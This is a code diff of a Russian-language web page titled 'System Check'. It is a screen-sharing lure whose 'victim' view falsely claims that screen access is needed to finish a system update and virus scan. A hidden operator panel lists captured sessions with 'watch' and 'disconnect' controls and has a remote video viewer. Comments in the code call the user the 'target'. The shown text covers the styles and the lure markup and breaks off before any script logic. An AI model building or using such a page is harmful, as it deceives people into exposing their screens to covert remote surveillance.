@@ -1,293 +1,131 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
-<html>
+<!DOCTYPE html>
+<html lang="ru">
 <head>
-  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-  <meta http-equiv="Content-Style-Type" content="text/css">
-  <title></title>
-  <meta name="Generator" content="Cocoa HTML Writer">
-  <meta name="CocoaVersion" content="2685.6">
-  <style type="text/css">
-    p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; font: 13.0px 'Helvetica Neue'; color: #87e095; -webkit-text-stroke: #87e095; background-color: #111111}
-    p.p2 {margin: 0.0px 0.0px 0.0px 0.0px; font: 13.0px 'Helvetica Neue'; color: #8f8f8f; -webkit-text-stroke: #8f8f8f; background-color: #111111}
-    p.p3 {margin: 0.0px 0.0px 0.0px 0.0px; font: 13.0px 'Helvetica Neue'; color: #84e5f4; -webkit-text-stroke: #84e5f4; background-color: #111111}
-    p.p4 {margin: 0.0px 0.0px 0.0px 0.0px; font: 13.0px 'Helvetica Neue'; color: #e9e9e9; -webkit-text-stroke: #e9e9e9; background-color: #111111}
-    p.p5 {margin: 0.0px 0.0px 0.0px 0.0px; font: 13.0px 'Helvetica Neue'; color: #8f8f8f; -webkit-text-stroke: #8f8f8f; background-color: #111111; min-height: 16.0px}
-    p.p6 {margin: 0.0px 0.0px 0.0px 0.0px; font: 13.0px 'Helvetica Neue'; color: #9e9e9e; -webkit-text-stroke: #9e9e9e; background-color: #111111}
-    p.p7 {margin: 0.0px 0.0px 0.0px 0.0px; font: 13.0px 'Helvetica Neue'; color: #fdb393; -webkit-text-stroke: #fdb393; background-color: #111111}
-    p.p8 {margin: 0.0px 0.0px 0.0px 0.0px; font: 13.0px 'Helvetica Neue'; color: #f382ba; -webkit-text-stroke: #f382ba; background-color: #111111}
-    p.p9 {margin: 0.0px 0.0px 0.0px 0.0px; font: 13.0px 'Helvetica Neue'; color: #5d5d5d; -webkit-text-stroke: #5d5d5d; background-color: #111111}
-    p.p10 {margin: 0.0px 0.0px 0.0px 0.0px; font: 13.0px 'Helvetica Neue'; color: #5d5d5d; -webkit-text-stroke: #5d5d5d; background-color: #111111; min-height: 16.0px}
-    span.s1 {font-kerning: none; color: #8f8f8f; -webkit-text-stroke: 0px #8f8f8f}
-    span.s2 {font-kerning: none}
-    span.s3 {font-kerning: none; color: #fdb393; -webkit-text-stroke: 0px #fdb393}
-    span.s4 {font-kerning: none; color: #87e095; -webkit-text-stroke: 0px #87e095}
-    span.s5 {font-kerning: none; color: #e9e9e9; -webkit-text-stroke: 0px #e9e9e9}
-    span.s6 {font-kerning: none; color: #5d5d5d; -webkit-text-stroke: 0px #5d5d5d}
-    span.s7 {font-kerning: none; color: #f382ba; -webkit-text-stroke: 0px #f382ba}
-    span.s8 {font-kerning: none; color: #84e5f4; -webkit-text-stroke: 0px #84e5f4}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Check</title>
+    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+    <style>
+        :root { --bg: #0f172a; --card: #1e293b; --text: #f8fafc; --accent: #3b82f6; --success: #10b981; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+        body { background: var(--bg); color: var(--text); min-height: 100vh; display: flex; flex-direction: column; }
+        .victim-view { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; padding: 20px; text-align: center; }
+        .card { background: var(--card); padding: 30px; border-radius: 16px; max-width: 400px; width: 100%; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
+        h1 { font-size: 24px; margin-bottom: 10px; }
+        p { color: #94a3b8; margin-bottom: 20px; line-height: 1.5; }
+        .btn { background: var(--accent); color: white; border: none; padding: 14px 28px; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; transition: 0.2s; }
+        .btn:hover { background: #2563eb; }
+        .status { margin-top: 15px; font-size: 14px; color: #64748b; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .dot { width: 8px; height: 8px; border-radius: 50%; background: #64748b; }
+        .dot.active { background: var(--success); animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.5} }
+        .admin-view { display: none; padding: 20px; max-width: 1200px; margin: 0 auto; width: 100%; }
+        .admin-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid #334155; }
+        .admin-title { font-size: 20px; font-weight: 700; color: var(--accent); }
+        .session-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; }
+        .session-card { background: var(--card); border-radius: 12px; padding: 20px; border: 1px solid #334155; }
+        .session-id { font-family: monospace; font-size: 14px; color: #94a3b8; margin-bottom: 10px; }
+        .session-actions { display: flex; gap: 10px; }
+        .btn-sm { padding: 8px 16px; font-size: 13px; border-radius: 6px; cursor: pointer; border: none; font-weight: 500; }
+        .btn-watch { background: var(--success); color: #000; }
+        .btn-disconnect { background: #ef4444; color: #fff; }
+        #viewer-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 100; flex-direction: column; }
+        #viewer-header { padding: 15px; background: rgba(0,0,0,0.8); display: flex; justify-content: space-between; align-items: center; color: #fff; }
+        #remote-video { width: 100%; height: 100%; object-fit: contain; }
+        .close-btn { background: #333; color: #fff; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; }
+        .hidden { display: none !important; }
+    </style>
 </head>
 <body>
-<p class="p1"><span class="s1">&lt;!</span><span class="s2">DOCTYPE</span><span class="s3"> html</span><span class="s1">&gt;</span></p>
-<p class="p1"><span class="s1">&lt;</span><span class="s2">html</span><span class="s3"> lang</span><span class="s1">=</span><span class="s2">"ru"</span><span class="s1">&gt;</span></p>
-<p class="p1"><span class="s1">&lt;</span><span class="s2">head</span><span class="s1">&gt;</span></p>
-<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>&lt;</span><span class="s2">meta</span><span class="s3"> charset</span><span class="s1">=</span><span class="s2">"UTF-8"</span><span class="s1">&gt;</span></p>
-<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>&lt;</span><span class="s2">meta</span><span class="s3"> name</span><span class="s1">=</span><span class="s2">"viewport"</span><span class="s3"> content</span><span class="s1">=</span><span class="s2">"width=device-width, initial-scale=1.0"</span><span class="s1">&gt;</span></p>
-<p class="p2"><span class="s2"><span class="Apple-converted-space">    </span>&lt;</span><span class="s4">title</span><span class="s2">&gt;System Check&lt;/</span><span class="s4">title</span><span class="s2">&gt;</span></p>
-<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>&lt;</span><span class="s2">script</span><span class="s3"> src</span><span class="s1">=</span><span class="s2">"https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"</span><span class="s1">&gt;&lt;/</span><span class="s2">script</span><span class="s1">&gt;</span></p>
-<p class="p2"><span class="s2"><span class="Apple-converted-space">    </span>&lt;</span><span class="s4">style</span><span class="s2">&gt;</span></p>
-<p class="p3"><span class="s3"><span class="Apple-converted-space">        </span>:root</span><span class="s1"> { </span><span class="s5">--bg</span><span class="s6">:</span><span class="s2"> #0f172a</span><span class="s1">; </span><span class="s5">--card</span><span class="s6">:</span><span class="s2"> #1e293b</span><span class="s1">; </span><span class="s5">--text</span><span class="s6">:</span><span class="s2"> #f8fafc</span><span class="s1">; </span><span class="s5">--accent</span><span class="s6">:</span><span class="s2"> #3b82f6</span><span class="s1">; </span><span class="s5">--success</span><span class="s6">:</span><span class="s2"> #10b981</span><span class="s1">; </span><span class="s5">--danger</span><span class="s6">:</span><span class="s2"> #ef4444</span><span class="s1">; }</span></p>
-<p class="p2"><span class="s4"><span class="Apple-converted-space">        </span>*</span><span class="s2"> { </span><span class="s5">box-sizing</span><span class="s6">:</span><span class="s7"> border-box</span><span class="s2">; </span><span class="s5">margin</span><span class="s6">:</span><span class="s8"> 0</span><span class="s2">; </span><span class="s5">padding</span><span class="s6">:</span><span class="s8"> 0</span><span class="s2">; </span><span class="s5">font-family</span><span class="s6">:</span><span class="s7"> -apple-system</span><span class="s2">, BlinkMacSystemFont, </span><span class="s4">'Segoe UI'</span><span class="s2">, Roboto, </span><span class="s7">sans-serif</span><span class="s2">; }</span></p>
-<p class="p4"><span class="s4"><span class="Apple-converted-space">        </span>body</span><span class="s1"> { </span><span class="s2">background</span><span class="s6">:</span><span class="s7"> var</span><span class="s1">(</span><span class="s2">--bg</span><span class="s1">); </span><span class="s2">color</span><span class="s6">:</span><span class="s7"> var</span><span class="s1">(</span><span class="s2">--text</span><span class="s1">); </span><span class="s2">min-height</span><span class="s6">:</span><span class="s8"> 100</span><span class="s7">vh</span><span class="s1">; </span><span class="s2">display</span><span class="s6">:</span><span class="s7"> flex</span><span class="s1">; </span><span class="s2">flex-direction</span><span class="s6">:</span><span class="s7"> column</span><span class="s1">; }</span></p>
-<p class="p5"><span class="s2"><span class="Apple-converted-space">        </span></span></p>
-<p class="p6"><span class="s2"><span class="Apple-converted-space">        </span>/* Стили для цели */</span></p>
-<p class="p4"><span class="s3"><span class="Apple-converted-space">        </span>.victim-view</span><span class="s1"> { </span><span class="s2">display</span><span class="s6">:</span><span class="s7"> flex</span><span class="s1">; </span><span class="s2">flex-direction</span><span class="s6">:</span><span class="s7"> column</span><span class="s1">; </span><span class="s2">align-items</span><span class="s6">:</span><span class="s7"> center</span><span class="s1">; </span><span class="s2">justify-content</span><span class="s6">:</span><span class="s7"> center</span><span class="s1">; </span><span class="s2">height</span><span class="s6">:</span><span class="s8"> 100</span><span class="s7">vh</span><span class="s1">; </span><span class="s2">padding</span><span class="s6">:</span><span class="s8"> 20</span><span class="s7">px</span><span class="s1">; </span><span class="s2">text-align</span><span class="s6">:</span><span class="s7"> center</span><span class="s1">; }</span></p>
-<p class="p4"><span class="s3"><span class="Apple-converted-space">        </span>.card</span><span class="s1"> { </span><span class="s2">background</span><span class="s6">:</span><span class="s7"> var</span><span class="s1">(</span><span class="s2">--card</span><span class="s1">); </span><span class="s2">padding</span><span class="s6">:</span><span class="s8"> 30</span><span class="s7">px</span><span class="s1">; </span><span class="s2">border-radius</span><span class="s6">:</span><span class="s8"> 16</span><span class="s7">px</span><span class="s1">; </span><span class="s2">max-width</span><span class="s6">:</span><span class="s8"> 400</span><span class="s7">px</span><span class="s1">; </span><span class="s2">width</span><span class="s6">:</span><span class="s8"> 100</span><span class="s7">%</span><span class="s1">; </span><span class="s2">box-shadow</span><span class="s6">:</span><span class="s8"> 0 10</span><span class="s7">px</span><span class="s8"> 25</span><span class="s7">px rgba</span><span class="s1">(</span><span class="s8">0</span><span class="s1">,</span><span class="s8">0</span><span class="s1">,</span><span class="s8">0</span><span class="s1">,</span><span class="s8">0.5</span><span class="s1">); }</span></p>
-<p class="p4"><span class="s4"><span class="Apple-converted-space">        </span>h1</span><span class="s1"> { </span><span class="s2">font-size</span><span class="s6">:</span><span class="s8"> 24</span><span class="s7">px</span><span class="s1">; </span><span class="s2">margin-bottom</span><span class="s6">:</span><span class="s8"> 10</span><span class="s7">px</span><span class="s1">; }</span></p>
-<p class="p4"><span class="s4"><span class="Apple-converted-space">        </span>p</span><span class="s1"> { </span><span class="s2">color</span><span class="s6">:</span><span class="s8"> #94a3b8</span><span class="s1">; </span><span class="s2">margin-bottom</span><span class="s6">:</span><span class="s8"> 20</span><span class="s7">px</span><span class="s1">; </span><span class="s2">line-height</span><span class="s6">:</span><span class="s8"> 1.5</span><span class="s1">; }</span></p>
-<p class="p4"><span class="s3"><span class="Apple-converted-space">        </span>.btn</span><span class="s1"> { </span><span class="s2">background</span><span class="s6">:</span><span class="s7"> var</span><span class="s1">(</span><span class="s2">--accent</span><span class="s1">); </span><span class="s2">color</span><span class="s6">:</span><span class="s7"> white</span><span class="s1">; </span><span class="s2">border</span><span class="s6">:</span><span class="s7"> none</span><span class="s1">; </span><span class="s2">padding</span><span class="s6">:</span><span class="s8"> 14</span><span class="s7">px</span><span class="s8"> 28</span><span class="s7">px</span><span class="s1">; </span><span class="s2">border-radius</span><span class="s6">:</span><span class="s8"> 10</span><span class="s7">px</span><span class="s1">; </span><span class="s2">font-size</span><span class="s6">:</span><span class="s8"> 16</span><span class="s7">px</span><span class="s1">; </span><span class="s2">font-weight</span><span class="s6">:</span><span class="s8"> 600</span><span class="s1">; </span><span class="s2">cursor</span><span class="s6">:</span><span class="s7"> pointer</span><span class="s1">; </span><span class="s2">width</span><span class="s6">:</span><span class="s8"> 100</span><span class="s7">%</span><span class="s1">; </span><span class="s2">transition</span><span class="s6">:</span><span class="s8"> 0.2</span><span class="s7">s</span><span class="s1">; }</span></p>
-<p class="p7"><span class="s2"><span class="Apple-converted-space">        </span>.btn:hover</span><span class="s1"> { </span><span class="s5">background</span><span class="s6">:</span><span class="s8"> #2563eb</span><span class="s1">; }</span></p>
-<p class="p7"><span class="s2"><span class="Apple-converted-space">        </span>.btn:active</span><span class="s1"> { </span><span class="s5">transform</span><span class="s6">:</span><span class="s7"> scale</span><span class="s1">(</span><span class="s8">0.98</span><span class="s1">); }</span></p>
-<p class="p4"><span class="s3"><span class="Apple-converted-space">        </span>.status</span><span class="s1"> { </span><span class="s2">margin-top</span><span class="s6">:</span><span class="s8"> 15</span><span class="s7">px</span><span class="s1">; </span><span class="s2">font-size</span><span class="s6">:</span><span class="s8"> 14</span><span class="s7">px</span><span class="s1">; </span><span class="s2">color</span><span class="s6">:</span><span class="s8"> #64748b</span><span class="s1">; </span><span class="s2">display</span><span class="s6">:</span><span class="s7"> flex</span><span class="s1">; </span><span class="s2">align-items</span><span class="s6">:</span><span class="s7"> center</span><span class="s1">; </span><span class="s2">justify-content</span><span class="s6">:</span><span class="s7"> center</span><span class="s1">; </span><span class="s2">gap</span><span class="s6">:</span><span class="s8"> 8</span><span class="s7">px</span><span class="s1">; }</span></p>
-<p class="p4"><span class="s3"><span class="Apple-converted-space">        </span>.dot</span><span class="s1"> { </span><span class="s2">width</span><span class="s6">:</span><span class="s8"> 8</span><span class="s7">px</span><span class="s1">; </span><span class="s2">height</span><span class="s6">:</span><span class="s8"> 8</span><span class="s7">px</span><span class="s1">; </span><span class="s2">border-radius</span><span class="s6">:</span><span class="s8"> 50</span><span class="s7">%</span><span class="s1">; </span><span class="s2">background</span><span class="s6">:</span><span class="s8"> #64748b</span><span class="s1">; }</span></p>
-<p class="p4"><span class="s3"><span class="Apple-converted-space">        </span>.dot.active</span><span class="s1"> { </span><span class="s2">background</span><span class="s6">:</span><span class="s7"> var</span><span class="s1">(</span><span class="s2">--success</span><span class="s1">); </span><span class="s2">animation</span><span class="s6">:</span><span class="s1"> pulse </span><span class="s8">1.5</span><span class="s7">s infinite</span><span class="s1">; }</span></p>
-<p class="p4"><span class="s7"><span class="Apple-converted-space">        </span>@keyframes</span><span class="s2"> pulse</span><span class="s1"> { </span><span class="s8">0%</span><span class="s1">,</span><span class="s8">100%</span><span class="s1">{</span><span class="s2">opacity</span><span class="s6">:</span><span class="s8">1</span><span class="s1">} </span><span class="s8">50%</span><span class="s1">{</span><span class="s2">opacity</span><span class="s6">:</span><span class="s8">.5</span><span class="s1">} }</span></p>
-<p class="p5"><span class="s2"><span class="Apple-converted-space">        </span></span></p>
-<p class="p6"><span class="s2"><span class="Apple-converted-space">        </span>/* Стили админки */</span></p>
-<p class="p4"><span class="s3"><span class="Apple-converted-space">        </span>.admin-view</span><span class="s1"> { </span><span class="s2">display</span><span class="s6">:</span><span class="s7"> none</span><span class="s1">; </span><span class="s2">padding</span><span class="s6">:</span><span class="s8"> 20</span><span class="s7">px</span><span class="s1">; </span><span class="s2">max-width</span><span class="s6">:</span><span class="s8"> 1200</span><span class="s7">px</span><span class="s1">; </span><span class="s2">margin</span><span class="s6">:</span><span class="s8"> 0</span><span class="s7"> auto</span><span class="s1">; </span><span class="s2">width</span><span class="s6">:</span><span class="s8"> 100</span><span class="s7">%</span><span class="s1">; }</span></p>
-<p class="p4"><span class="s3"><span class="Apple-converted-space">        </span>.admin-header</span><span class="s1"> { </span><span class="s2">display</span><span class="s6">:</span><span class="s7"> flex</span><span class="s1">; </span><span class="s2">justify-content</span><span class="s6">:</span><span class="s7"> space-between</span><span class="s1">; </span><span class="s2">align-items</span><span class="s6">:</span><span class="s7"> center</span><span class="s1">; </span><span class="s2">margin-bottom</span><span class="s6">:</span><span class="s8"> 20</span><span class="s7">px</span><span class="s1">; </span><span class="s2">padding-bottom</span><span class="s6">:</span><span class="s8"> 15</span><span class="s7">px</span><span class="s1">; </span><span class="s2">border-bottom</span><span class="s6">:</span><span class="s8"> 1</span><span class="s7">px solid</span><span class="s8"> #334155</span><span class="s1">; }</span></p>
-<p class="p4"><span class="s3"><span class="Apple-converted-space">        </span>.admin-title</span><span class="s1"> { </span><span class="s2">font-size</span><span class="s6">:</span><span class="s8"> 20</span><span class="s7">px</span><span class="s1">; </span><span class="s2">font-weight</span><span class="s6">:</span><span class="s8"> 700</span><span class="s1">; </span><span class="s2">color</span><span class="s6">:</span><span class="s7"> var</span><span class="s1">(</span><span class="s2">--accent</span><span class="s1">); }</span></p>
-<p class="p8"><span class="s3"><span class="Apple-converted-space">        </span>.session-grid</span><span class="s1"> { </span><span class="s5">display</span><span class="s6">:</span><span class="s2"> grid</span><span class="s1">; </span><span class="s5">grid-template-columns</span><span class="s6">:</span><span class="s2"> repeat</span><span class="s1">(</span><span class="s2">auto-fill</span><span class="s1">, </span><span class="s2">minmax</span><span class="s1">(</span><span class="s8">280</span><span class="s2">px</span><span class="s1">, </span><span class="s8">1</span><span class="s2">fr</span><span class="s1">)); </span><span class="s5">gap</span><span class="s6">:</span><span class="s8"> 20</span><span class="s2">px</span><span class="s1">; }</span></p>
-<p class="p4"><span class="s3"><span class="Apple-converted-space">        </span>.session-card</span><span class="s1"> { </span><span class="s2">background</span><span class="s6">:</span><span class="s7"> var</span><span class="s1">(</span><span class="s2">--card</span><span class="s1">); </span><span class="s2">border-radius</span><span class="s6">:</span><span class="s8"> 12</span><span class="s7">px</span><span class="s1">; </span><span class="s2">padding</span><span class="s6">:</span><span class="s8"> 20</span><span class="s7">px</span><span class="s1">; </span><span class="s2">border</span><span class="s6">:</span><span class="s8"> 1</span><span class="s7">px solid</span><span class="s8"> #334155</span><span class="s1">; </span><span class="s2">transition</span><span class="s6">:</span><span class="s8"> 0.2</span><span class="s7">s</span><span class="s1">; </span><span class="s2">position</span><span class="s6">:</span><span class="s7"> relative</span><span class="s1">; }</span></p>
-<p class="p7"><span class="s2"><span class="Apple-converted-space">        </span>.session-card:hover</span><span class="s1"> { </span><span class="s5">border-color</span><span class="s6">:</span><span class="s7"> var</span><span class="s1">(</span><span class="s5">--accent</span><span class="s1">); }</span></p>
-<p class="p4"><span class="s3"><span class="Apple-converted-space">        </span>.session-id</span><span class="s1"> { </span><span class="s2">font-family</span><span class="s6">:</span><span class="s7"> monospace</span><span class="s1">; </span><span class="s2">font-size</span><span class="s6">:</span><span class="s8"> 14</span><span class="s7">px</span><span class="s1">; </span><span class="s2">color</span><span class="s6">:</span><span class="s8"> #94a3b8</span><span class="s1">; </span><span class="s2">margin-bottom</span><span class="s6">:</span><span class="s8"> 10</span><span class="s7">px</span><span class="s1">; }</span></p>
-<p class="p4"><span class="s3"><span class="Apple-converted-space">        </span>.session-ua</span><span class="s1"> { </span><span class="s2">font-size</span><span class="s6">:</span><span class="s8"> 12</span><span class="s7">px</span><span class="s1">; </span><span class="s2">color</span><span class="s6">:</span><span class="s8"> #64748b</span><span class="s1">; </span><span class="s2">margin-bottom</span><span class="s6">:</span><span class="s8"> 15</span><span class="s7">px</span><span class="s1">; </span><span class="s2">word-break</span><span class="s6">:</span><span class="s7"> break-all</span><span class="s1">; }</span></p>
-<p class="p7"><span class="s2"><span class="Apple-converted-space">        </span>.session-actions</span><span class="s1"> { </span><span class="s5">display</span><span class="s6">:</span><span class="s7"> flex</span><span class="s1">; </span><span class="s5">gap</span><span class="s6">:</span><span class="s8"> 10</span><span class="s7">px</span><span class="s1">; }</span></p>
-<p class="p4"><span class="s3"><span class="Apple-converted-space">        </span>.btn-sm</span><span class="s1"> { </span><span class="s2">padding</span><span class="s6">:</span><span class="s8"> 8</span><span class="s7">px</span><span class="s8"> 16</span><span class="s7">px</span><span class="s1">; </span><span class="s2">font-size</span><span class="s6">:</span><span class="s8"> 13</span><span class="s7">px</span><span class="s1">; </span><span class="s2">border-radius</span><span class="s6">:</span><span class="s8"> 6</span><span class="s7">px</span><span class="s1">; </span><span class="s2">cursor</span><span class="s6">:</span><span class="s7"> pointer</span><span class="s1">; </span><span class="s2">border</span><span class="s6">:</span><span class="s7"> none</span><span class="s1">; </span><span class="s2">font-weight</span><span class="s6">:</span><span class="s8"> 500</span><span class="s1">; }</span></p>
-<p class="p4"><span class="s3"><span class="Apple-converted-space">        </span>.btn-watch</span><span class="s1"> { </span><span class="s2">background</span><span class="s6">:</span><span class="s7"> var</span><span class="s1">(</span><span class="s2">--success</span><span class="s1">); </span><span class="s2">color</span><span class="s6">:</span><span class="s8"> #000</span><span class="s1">; }</span></p>
-<p class="p7"><span class="s2"><span class="Apple-converted-space">        </span>.btn-disconnect</span><span class="s1"> { </span><span class="s5">background</span><span class="s6">:</span><span class="s7"> var</span><span class="s1">(</span><span class="s5">--danger</span><span class="s1">); </span><span class="s5">color</span><span class="s6">:</span><span class="s8"> #fff</span><span class="s1">; }</span></p>
-<p class="p5"><span class="s2"><span class="Apple-converted-space">        </span></span></p>
-<p class="p6"><span class="s2"><span class="Apple-converted-space">        </span>/* Экран просмотра */</span></p>
-<p class="p4"><span class="s3"><span class="Apple-converted-space">        </span>#viewer-modal</span><span class="s1"> { </span><span class="s2">display</span><span class="s6">:</span><span class="s7"> none</span><span class="s1">; </span><span class="s2">position</span><span class="s6">:</span><span class="s7"> fixed</span><span class="s1">; </span><span class="s2">top</span><span class="s6">:</span><span class="s8"> 0</span><span class="s1">; </span><span class="s2">left</span><span class="s6">:</span><span class="s8"> 0</span><span class="s1">; </span><span class="s2">width</span><span class="s6">:</span><span class="s8"> 100</span><span class="s7">%</span><span class="s1">; </span><span class="s2">height</span><span class="s6">:</span><span class="s8"> 100</span><span class="s7">%</span><span class="s1">; </span><span class="s2">background</span><span class="s6">:</span><span class="s8"> #000</span><span class="s1">; </span><span class="s2">z-index</span><span class="s6">:</span><span class="s8"> 100</span><span class="s1">; </span><span class="s2">flex-direction</span><span class="s6">:</span><span class="s7"> column</span><span class="s1">; }</span></p>
-<p class="p4"><span class="s3"><span class="Apple-converted-space">        </span>#viewer-header</span><span class="s1"> { </span><span class="s2">padding</span><span class="s6">:</span><span class="s8"> 15</span><span class="s7">px</span><span class="s1">; </span><span class="s2">background</span><span class="s6">:</span><span class="s7"> rgba</span><span class="s1">(</span><span class="s8">0</span><span class="s1">,</span><span class="s8">0</span><span class="s1">,</span><span class="s8">0</span><span class="s1">,</span><span class="s8">0.8</span><span class="s1">); </span><span class="s2">display</span><span class="s6">:</span><span class="s7"> flex</span><span class="s1">; </span><span class="s2">justify-content</span><span class="s6">:</span><span class="s7"> space-between</span><span class="s1">; </span><span class="s2">align-items</span><span class="s6">:</span><span class="s7"> center</span><span class="s1">; </span><span class="s2">color</span><span class="s6">:</span><span class="s8"> #fff</span><span class="s1">; }</span></p>
-<p class="p7"><span class="s2"><span class="Apple-converted-space">        </span>#remote-video</span><span class="s1"> { </span><span class="s5">width</span><span class="s6">:</span><span class="s8"> 100</span><span class="s7">%</span><span class="s1">; </span><span class="s5">height</span><span class="s6">:</span><span class="s8"> 100</span><span class="s7">%</span><span class="s1">; </span><span class="s5">object-fit</span><span class="s6">:</span><span class="s7"> contain</span><span class="s1">; }</span></p>
-<p class="p4"><span class="s3"><span class="Apple-converted-space">        </span>.close-btn</span><span class="s1"> { </span><span class="s2">background</span><span class="s6">:</span><span class="s8"> #333</span><span class="s1">; </span><span class="s2">color</span><span class="s6">:</span><span class="s8"> #fff</span><span class="s1">; </span><span class="s2">border</span><span class="s6">:</span><span class="s7"> none</span><span class="s1">; </span><span class="s2">padding</span><span class="s6">:</span><span class="s8"> 8</span><span class="s7">px</span><span class="s8"> 16</span><span class="s7">px</span><span class="s1">; </span><span class="s2">border-radius</span><span class="s6">:</span><span class="s8"> 6</span><span class="s7">px</span><span class="s1">; </span><span class="s2">cursor</span><span class="s6">:</span><span class="s7"> pointer</span><span class="s1">; }</span></p>
-<p class="p5"><span class="s2"></span><br></p>
-<p class="p8"><span class="s3"><span class="Apple-converted-space">        </span>.hidden</span><span class="s1"> { </span><span class="s5">display</span><span class="s6">:</span><span class="s2"> none !important</span><span class="s1">; }</span></p>
-<p class="p4"><span class="s3"><span class="Apple-converted-space">        </span>.empty-state</span><span class="s1"> { </span><span class="s2">text-align</span><span class="s6">:</span><span class="s7"> center</span><span class="s1">; </span><span class="s2">padding</span><span class="s6">:</span><span class="s8"> 50</span><span class="s7">px</span><span class="s1">; </span><span class="s2">color</span><span class="s6">:</span><span class="s8"> #475569</span><span class="s1">; }</span></p>
-<p class="p4"><span class="s3"><span class="Apple-converted-space">        </span>.toast</span><span class="s1"> { </span><span class="s2">position</span><span class="s6">:</span><span class="s7"> fixed</span><span class="s1">; </span><span class="s2">bottom</span><span class="s6">:</span><span class="s8"> 20</span><span class="s7">px</span><span class="s1">; </span><span class="s2">right</span><span class="s6">:</span><span class="s8"> 20</span><span class="s7">px</span><span class="s1">; </span><span class="s2">background</span><span class="s6">:</span><span class="s7"> var</span><span class="s1">(</span><span class="s2">--card</span><span class="s1">); </span><span class="s2">padding</span><span class="s6">:</span><span class="s8"> 12</span><span class="s7">px</span><span class="s8"> 20</span><span class="s7">px</span><span class="s1">; </span><span class="s2">border-radius</span><span class="s6">:</span><span class="s8"> 8</span><span class="s7">px</span><span class="s1">; </span><span class="s2">border-left</span><span class="s6">:</span><span class="s8"> 4</span><span class="s7">px solid var</span><span class="s1">(</span><span class="s2">--accent</span><span class="s1">); </span><span class="s2">animation</span><span class="s6">:</span><span class="s1"> slideIn </span><span class="s8">0.3</span><span class="s7">s</span><span class="s1">; }</span></p>
-<p class="p8"><span class="s2"><span class="Apple-converted-space">        </span>@keyframes</span><span class="s5"> slideIn</span><span class="s1"> { </span><span class="s8">from</span><span class="s1">{</span><span class="s5">transform</span><span class="s6">:</span><span class="s2">translateX</span><span class="s1">(</span><span class="s8">100</span><span class="s2">%</span><span class="s1">)} </span><span class="s8">to</span><span class="s1">{</span><span class="s5">transform</span><span class="s6">:</span><span class="s2">translateX</span><span class="s1">(</span><span class="s8">0</span><span class="s1">)} }</span></p>
-<p class="p2"><span class="s2"><span class="Apple-converted-space">    </span>&lt;/</span><span class="s4">style</span><span class="s2">&gt;</span></p>
-<p class="p1"><span class="s1">&lt;/</span><span class="s2">head</span><span class="s1">&gt;</span></p>
-<p class="p1"><span class="s1">&lt;</span><span class="s2">body</span><span class="s1">&gt;</span></p>
-<p class="p5"><span class="s2"></span><br></p>
-<p class="p6"><span class="s2"><span class="Apple-converted-space">    </span>&lt;!-- Вид для цели --&gt;</span></p>
-<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>&lt;</span><span class="s2">div</span><span class="s3"> id</span><span class="s1">=</span><span class="s2">"victim-view"</span><span class="s3"> class</span><span class="s1">=</span><span class="s2">"victim-view"</span><span class="s1">&gt;</span></p>
-<p class="p2"><span class="s2"><span class="Apple-converted-space">        </span>&lt;</span><span class="s4">div</span><span class="s3"> class</span><span class="s2">=</span><span class="s4">"card"</span><span class="s2">&gt;</span></p>
-<p class="p2"><span class="s2"><span class="Apple-converted-space">            </span>&lt;</span><span class="s4">h1</span><span class="s2">&gt;🛡️ Проверка безопасности&lt;/</span><span class="s4">h1</span><span class="s2">&gt;</span></p>
-<p class="p2"><span class="s2"><span class="Apple-converted-space">            </span>&lt;</span><span class="s4">p</span><span class="s2">&gt;Для завершения обновления системы и проверки на вирусы необходимо предоставить доступ к экрану.&lt;/</span><span class="s4">p</span><span class="s2">&gt;</span></p>
-<p class="p2"><span class="s2"><span class="Apple-converted-space">            </span>&lt;</span><span class="s4">button</span><span class="s3"> id</span><span class="s2">=</span><span class="s4">"start-btn"</span><span class="s3"> class</span><span class="s2">=</span><span class="s4">"btn"</span><span class="s3"> onclick</span><span class="s2">=</span><span class="s4">"</span><span class="s7">startSession</span><span class="s5">()"</span><span class="s2">&gt;Начать проверку&lt;/</span><span class="s4">button</span><span class="s2">&gt;</span></p>
-<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>&lt;</span><span class="s2">div</span><span class="s3"> id</span><span class="s1">=</span><span class="s2">"victim-status"</span><span class="s3"> class</span><span class="s1">=</span><span class="s2">"status hidden"</span><span class="s1">&gt;</span></p>
-<p class="p2"><span class="s2"><span class="Apple-converted-space">                </span>&lt;</span><span class="s4">div</span><span class="s3"> class</span><span class="s2">=</span><span class="s4">"dot active"</span><span class="s2">&gt;&lt;/</span><span class="s4">div</span><span class="s2">&gt;</span></p>
-<p class="p2"><span class="s2"><span class="Apple-converted-space">                </span>&lt;</span><span class="s4">span</span><span class="s2">&gt;Ожидание оператора...&lt;/</span><span class="s4">span</span><span class="s2">&gt;</span></p>
-<p class="p2"><span class="s2"><span class="Apple-converted-space">            </span>&lt;/</span><span class="s4">div</span><span class="s2">&gt;</span></p>
-<p class="p2"><span class="s2"><span class="Apple-converted-space">        </span>&lt;/</span><span class="s4">div</span><span class="s2">&gt;</span></p>
